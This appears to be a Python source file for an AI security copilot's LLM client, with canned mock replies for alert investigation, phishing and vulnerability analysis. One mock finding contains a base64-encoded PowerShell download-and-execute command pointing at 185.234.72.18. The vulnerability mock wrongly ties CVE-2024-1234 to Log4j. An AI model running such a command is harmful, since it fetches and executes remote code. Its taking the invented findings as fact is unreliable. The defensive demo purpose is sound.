import json
from typing import Optional, List, Dict, Any
from core.config import settings


class LLMClient:
    def __init__(self):
        self.provider = settings.LLM_PROVIDER
        self.client = None
        self._init_client()

    def _init_client(self):
        if self.provider == "gemini" and settings.GOOGLE_GEMINI_API_KEY:
            try:
                import google.generativeai as genai
                genai.configure(api_key=settings.GOOGLE_GEMINI_API_KEY)
                self.client = genai.GenerativeModel("gemini-2.0-flash")
            except Exception:
                self.client = None
        elif self.provider == "openai" and settings.OPENAI_API_KEY:
            try:
                from openai import AsyncOpenAI
                self.client = AsyncOpenAI(api_key=settings.OPENAI_API_KEY)
            except Exception:
                self.client = None
        elif settings.LOCAL_LLM_URL:
            self.client = "local"

    async def chat(self, messages: List[Dict[str, str]], system_prompt: Optional[str] = None) -> str:
        if system_prompt:
            messages = [{"role": "system", "content": system_prompt}] + messages

        if self.provider == "gemini" and self.client:
            return await self._gemini_chat(messages)
        elif self.provider == "openai" and self.client:
            return await self._openai_chat(messages)
        elif self.client == "local":
            return await self._local_chat(messages)
        else:
            return self._mock_chat(messages)

    async def _gemini_chat(self, messages: List[Dict[str, str]]) -> str:
        try:
            import google.generativeai as genai
            formatted = []
            for m in messages:
                if m["role"] in ("user", "assistant"):
                    formatted.append({"role": m["role"], "parts": [m["content"]]})
            chat = self.client.start_chat(history=formatted[:-1])
            response = chat.send_message(formatted[-1]["parts"][0] if formatted else "")
            return response.text
        except Exception as e:
            return f"AI service error: {str(e)}"

    async def _openai_chat(self, messages: List[Dict[str, str]]) -> str:
        try:
            response = await self.client.chat.completions.create(
                model="gpt-4o-mini",
                messages=messages,
                max_tokens=2000,
            )
            return response.choices[0].message.content
        except Exception as e:
            return f"AI service error: {str(e)}"

    async def _local_chat(self, messages: List[Dict[str, str]]) -> str:
        try:
            import httpx
            async with httpx.AsyncClient() as client:
                response = await client.post(
                    f"{settings.LOCAL_LLM_URL}/api/chat",
                    json={
                        "model": settings.LOCAL_LLM_MODEL,
                        "messages": messages,
                        "stream": False,
                    },
                    timeout=30,
                )
                data = response.json()
                return data.get("message", {}).get("content", "")
        except Exception as e:
            return self._mock_chat(messages)

    def _mock_chat(self, messages: List[Dict[str, str]]) -> str:
        last_msg = messages[-1]["content"].lower() if messages else ""

        if "investigate" in last_msg or "analyze alert" in last_msg:
            return self._mock_investigation()
        elif "phishing" in last_msg or "email" in last_msg:
            return self._mock_phishing_analysis()
        elif "powershell" in last_msg or "suspicious" in last_msg:
            return self._mock_powershell_analysis()
        elif "vulnerability" in last_msg or "cve" in last_msg:
            return self._mock_vuln_analysis()
        elif "summary" in last_msg or "overview" in last_msg:
            return self._mock_summary()
        elif "lateral" in last_msg or "movement" in last_msg:
            return self._mock_lateral_movement()
        elif "block" in last_msg or "respond" in last_msg or "action" in last_msg:
            return self._mock_response_recommendations()
        else:
            return self._mock_general_security()

    def _mock_investigation(self) -> str:
        return """## Investigation Results

### Summary
I've analyzed the security alert and correlated events across 3 data sources (EDR, Network, Authentication logs).

### Findings
1. **Initial Access**: Process `powershell.exe` (PID: 4523) executed on WKS-047 at 14:23:12 UTC
2. **Command Line**: `powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMANAAuADcAMgAuADEAOAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA`
3. **Decoded**: Downloads and executes payload from `185.234.72.18/payload.ps1`
4. **Network Connection**: Established outbound HTTPS to `185.234.72.18:443` (Known C2 infrastructure - APT29 associated)
5. **Lateral Movement**: PsExec from WKS-047 → SRV-DC01 at 14:25:47 UTC

### Impact
- **Compromised Hosts**: WKS-047, SRV-DC01
- **Data at Risk**: Active Directory database, Customer PII database
- **User Accounts**: 3 privileged accounts potentially compromised

### MITRE ATT&CK Techniques
- T1059.001 (PowerShell)
- T1105 (Ingress Tool Transfer)
- T1071.001 (Web Protocols)
- T1021.002 (SMB/Windows Admin Shares)
"""

    def _mock_phishing_analysis(self) -> str:
        return """## Phishing Email Analysis

### Email Details
- **Subject**: "Urgent: Invoice Payment Required"
- **Sender**: `invoices@paypa1-secure.com` (Spoofed)
- **Recipient**: 12 internal users
- **Timestamp**: 2025-01-15 09:23:45 UTC

### Indicators
- **SPF**: Fail (sender domain not authorized)
- **DKIM**: No signature
- **DMARC**: Quarantine policy triggered
- **URL Analysis**: `hxxps://paypa1-secure[.]com/login` → Resolves to `185.234.72.18`
- **Attachment**: `invoice_2025.pdf` (contains malicious macros)

### Verdict
**MALICIOUS** - Confidence: 96%

This is a Business Email Compromise (BEC) attempt using a typosquatted PayPal domain with a malicious PDF attachment containing VBA macros that download additional payload.

### Recommended Actions
1. Block sender domain `paypa1-secure.com`
2. Block IP `185.234.72.18`
3. Quarantine all emails from this sender
4. Notify affected users
5. Scan endpoints of users who opened the attachment
"""

    def _mock_powershell_analysis(self) -> str:
        return "## PowerShell Analysis\n\n### Event\nSuspicious PowerShell execution detected on WKS-047\n\n### Risk Assessment\n**Severity: HIGH**\nThe encoded command contains base64-encoded C# code that injects into a running process (process hollowing). This is a common technique used by ransomware groups to evade detection.\n\n### Recommendations\n1. Isolate WKS-047 immediately\n2. Kill process tree (PID: 4523)\n3. Check for persistence mechanisms (scheduled tasks, run keys)\n4. Scan for additional payloads\n5. Review authentication logs for credential theft"

    def _mock_vuln_analysis(self) -> str:
        return "## Vulnerability Analysis\n\n**CVE-2024-1234** | CVSS: 9.8 (Critical)\n\n### Description\nRemote code execution vulnerability in Apache Log4j 2.x versions < 2.17.1. Affects 15 assets in your environment.\n\n### Exploitation Risk\n**VERY HIGH** - Public exploit code available, actively exploited in the wild by APT29, LockBit, and multiple ransomware groups.\n\n### Business Impact\nRemote code execution on critical infrastructure could lead to:\n- Data breach (estimated cost: $2.5M+)\n- Ransomware deployment\n- Lateral movement to crown jewel systems\n- Regulatory fines (GDPR: up to 4% of annual revenue)\n\n### Remediation\n1. Update Log4j to 2.17.1+ (Estimated: 4 hours per server)\n2. Apply WAF rules as temporary mitigation\n3. Monitor for exploitation attempts (detection rules deployed)\n4. Priority: SRV-DC01, SRV-APP01, SRV-DB01"

    def _mock_summary(self) -> str:
        return "## Security Posture Summary\n\n**Current Risk Score: 7.2/10**\n\n### Active Threats (12)\n- 3 Critical (Ransomware indicators, C2 beacon, Credential dumping)\n- 5 High (Lateral movement, Phishing campaign, Privilege escalation)\n- 4 Medium (Policy violations, Anomalous behavior)\n\n### Recommendations\n1. **Immediate**: Isolate WKS-047 (ransomware behavior detected)\n2. **Today**: Patch CVE-2024-1234 on domain controllers\n3. **This Week**: Review and remediate 12 critical vulnerabilities\n4. **This Month**: Implement MFA for all privileged accounts"

    def _mock_lateral_movement(self) -> str:
        return "## Lateral Movement Investigation\n\n### Attack Path\n`WKS-047 (User: jdoe)` → `SRV-FILE01` → `SRV-DC01`\n\n### Timeline\n1. **14:23** - Initial compromise via phishing email on WKS-047\n2. **14:25** - Credential theft (Mimikatz) on WKS-047\n3. **14:28** - Pass-the-Hash to SRV-FILE01\n4. **14:31** - Data staging on SRV-FILE01\n5. **14:35** - PsExec to SRV-DC01 (Domain Admin)\n\n### Containment Steps\n1. Isolate all compromised hosts\n2. Reset krbtgt password (twice)\n3. Rotate all Domain Admin credentials\n4. Enable advanced audit policy"

    def _mock_response_recommendations(self) -> str:
        return "## Recommended Response Actions\n\nBased on my analysis, here are the recommended actions in priority order:\n\n| Priority | Action | Target | Rationale |\n|----------|--------|--------|-----------|\n| 1 | 🔴 Isolate Endpoint | WKS-047 | Active C2 communication detected |\n| 2 | 🔴 Kill Process | PID 4523 (powershell) | Malicious process running |\n| 3 | 🔴 Block IP | 185.234.72.18 | Known C2 infrastructure |\n| 4 | 🟡 Block Domain | paypa1-secure.com | Phishing domain |\n| 5 | 🟡 Disable User | jdoe | Credentials compromised |\n| 6 | 🟢 Quarantine File | payload.ps1 | Malicious payload |"

    def _mock_general_security(self) -> str:
        return "Hello, I'm your AI Security Copilot. I can help you with:\n\n1. **Investigate** - Analyze alerts and incidents\n2. **Hunt** - Query for threats using natural language\n3. **Explain** - Understand security events and vulnerabilities\n4. **Recommend** - Get remediation steps and response actions\n5. **Report** - Generate security summaries and reports\n\nTry asking me:\n- 'Investigate alert ID abc-123'\n- 'Show me suspicious PowerShell executions in the last 24 hours'\n- 'What is the risk of CVE-2024-1234?'\n- 'Summarize our current security posture'\n- 'Recommend actions for the active ransomware alert'"


llm_client = LLMClient()
